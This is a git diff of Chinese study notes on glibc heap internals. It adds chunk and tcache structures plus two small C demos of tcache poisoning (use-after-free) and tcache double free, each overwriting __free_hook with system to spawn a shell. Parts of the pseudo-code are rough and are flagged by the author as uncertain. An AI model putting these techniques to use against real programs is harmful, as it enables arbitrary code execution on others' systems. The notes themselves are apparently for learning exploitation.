@@ -2335,6 +2335,49 @@ int main(){
 - **malloc_chunk**: 无论大小，分配 / 释放状态，chunk都使用一个结构体 malloc_chunk 来表示。但根据是否被释放，malloc_chunk 表现形式有不同。
 
 ```cpp
+struct chunk{ 
+    size_t prev_size;
+    size_t size; // size最低位为1标识chunk在使用中
+    union{  // 注意这里是union 视使用与否有区别 // malloc返回的就是这部分内存
+        char buf[size-0x10];
+        struct content{
+            chunk* fwd;
+            chunk* bwk; // 
+        }
+    }
+}
+```
+
+```cpp
+struct chunk{ // chunk使用时的结构
+	size_t prev_size;
+	size_t size; // size最低位为1
+	char buf[size-0x10]; // malloc返回的地址
+}
+```
+
+```cpp
+struct chunk{ // chunk释放后的结构
+	size_t prev_size;
+	size_t size; // size最低位为0
+	chunk* fd;
+	chunk* bk;
+}
+```
+
+```cpp
+// chunk在内存中的布局 // 一个接一个按序存放  // 存疑，0x21后为什么是fd bk?
+| in used | 0x21   |
+|   fd    |   bk   |
+|  0x20   |  0xa0  |  // 0xa0 0结尾表示未使用，则0x20处有效，指前一个chunk大小为0x20
+|      in used     |
+|      in used     |
+| in used | 0x21   |
+```
+
+
+
+```cpp
 // malloc_chunk 结构 仅用作理解 // ptmalloc 用 malloc_chunk 表示 mallloc 申请的内存(chunk)
 struct malloc_chunk { // default: define INTERNAL_SIZE_T size_t 
   INTERNAL_SIZE_T      prev_size; // Size of previous chunk (if free). 前一个chunk的大小(free后有效)
@@ -2344,7 +2387,7 @@ struct malloc_chunk { // default: define INTERNAL_SIZE_T size_t
   struct malloc_chunk* bk;
 
  // Only used for large blocks: pointer to next larger size.
-  struct malloc_chunk* fd_nextsize;// double links -- used only if free.
+  struct malloc_chunk* fd_nextsize; // double links -- used only if free.
   struct malloc_chunk* bk_nextsize;
 };
 ```
@@ -2618,11 +2661,13 @@ typedef struct malloc_chunk *mbinptr;
 
 
 
-
+- 1. 
 
 
 
 ### Heap Overflow
+
+
 
 
 
@@ -2641,6 +2686,112 @@ typedef struct malloc_chunk *mbinptr;
 - 内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。
 
 一般所指的 **Use After Free** 漏洞主要是后两种。一般称被释放后没有被设置为NULL的内存指针为**dangling pointer**。
+
+
+
+### Tcache & Tcache Attack
+
+> Thread Cache?
+
+glibc 2.26(ubuntu 17.10)之后引入的技术，用于缓存各个线程释放的内存，用于加速多线程下内存申请。每个线程都有自己的Tcache，因此从tcache中malloc内存时不需要加锁。但欠缺安全检查。
+
+- 使用简单单链表管理free后的内存，相同大小的放同一条链上。next指针指向下一个大小相同的chunk的user data(fd指针)
+- 用一个数组存储各个链表的根节点
+- 有另一个数组存储链表长度
+- 第`i`个根节点存储大小为 `0x10*(i+2)` 的chunk. 0x21, 0x31,0x41...
+
+```cpp
+# define TCACHE_MAX_BINS  64
+typedef struct tcache_perthread_struct{
+  char counts[TCACHE_MAX_BINS]; // 链表长度数组(0~7)  // 各链chunk size=0x21, 0x31...
+  tcache_entry *entries[TCACHE_MAX_BINS]; // 链表头指针数组
+} tcache_perthread_struct;
+static __thread tcache_perthread_struct *tcache = NULL;
+```
+
+
+
+tcache攻击作用：
+
+- 任意内存读写
+- RCE
+  - 利用任意内存读写修改函数指针，free_hook, malloc_hook, got表
+
+malloc/free过程：
+
+- malloc:
+  1. tcache有合适的：直接从链表拿出一个chunk返回
+  2. tcache没有合适的：调 `_int_malloc`分配
+- free:
+  1. 找对应大小的链表，检查链表节点数
+  2. 节点数小于7：将chunk放进去
+  3. 节点数等于7：将chunk放到其他地方（TBD）
+
+
+
+
+
+#### Tcache Poisoning: UAF
+
+> https://blog.csdn.net/qq_41202237/article/details/113400567
+
+通过UAF, ... 修改链表中的fd指针(即chunk data首地址)
+
+```cpp
+int main(){ // Tcache Poisoning: UAF simplest demo
+	long long* p1 = malloc(0x50); long long *p2 = malloc(0x50);
+	free(p1); // tcache(0x51) 链 chunk+1
+	free(p2); // tcache(0x51) 链 chunk+1 // 现在0x51的链上有两个chunk
+	p2[0] = &__free_hook; // Vul: Use After Free // 把第一个chunk的fd指针修改为__free_hook的地址
+	p1 = malloc(0x50); // 取出0x51首chunk, entries[3]指向下一chunk fd // *entries[3]=__free_hook
+	p2 = malloc(0x50); // p2 = &__free_hook
+	p2[0] = system; // 改__free_hook值为system
+	free("/bin/sh");  // system(str) // free先检查__free_hook是否为NULL
+}// 相当于调用了system("/bin/sh") getshell
+```
+
+> `__free_hook`默认为NULL，free时检查，不为NULL则`call __free_hook`后再调用`free`
+
+
+
+#### Tcache Dup: Double Free
+
+利用double free将同一个chunk free两次
+
+```cpp
+// tcache double free procedure:
+e -> fd1 -> fd2 // 1st free: free fd1一次时，fd1正常指向fd2 链表头指针e正常指向fd1
+// 2nd free: 按单链表add操作：1. 将后添加的 fd1_ 指向 fd1 (实际上 fd1_ == fd1 )  2. e指向fd1_
+e -> fd1_ -> fd1 // 实际上 fd1_==fd1，即现在 fd1 指向自己
+// 1st malloc: 注意要 malloc 相同的 size
+e -> fd1 // malloc: 1. 拿出头指针 e 指向的 fd1_ 2. e指向下一个chunk fd1
+```
+
+- 此时手里的`fd1_`其实就是tcache上的`fd1`，编辑手上的`chunk fd1_`即可修改tcache上的`chunk fd1`指针
+
+```cpp
+#include<stdio.h>
+#include<stdlib.h>
+#include<string.h>
+#include "malloc.h"
+int main(){ // gcc a.cpp -o a -fpermissive       -Wno-conversion-null -w
+    long long * p1;
+    p1 = malloc(0x50);
+    free(p1);
+    free(p1);
+    free(p1);
+    p1 = malloc(0x50);
+    p1[0] = &__free_hook;
+    p1 = malloc(0x50);
+    p1 = malloc(0x50);
+    p1[0] = (long long)&system;
+    free("/bin/sh");
+}
+```
+
+
+
+
 
 
 
